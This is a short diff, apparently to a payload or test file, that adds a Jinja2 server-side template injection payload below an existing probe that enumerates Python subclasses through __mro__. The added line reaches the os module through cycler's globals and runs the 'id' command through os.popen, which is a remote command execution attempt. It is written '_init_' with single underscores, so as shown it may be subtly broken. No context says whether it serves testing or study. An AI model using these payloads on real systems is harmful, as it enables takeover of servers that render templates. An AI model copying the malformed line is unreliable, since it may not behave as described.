@@ -5,3 +5,6 @@
 
 
 {{ ''.__class__.__mro__[1].__subclasses__() }}
+
+
+{{ cycler._init_.__globals__.os.popen('id').read() }}
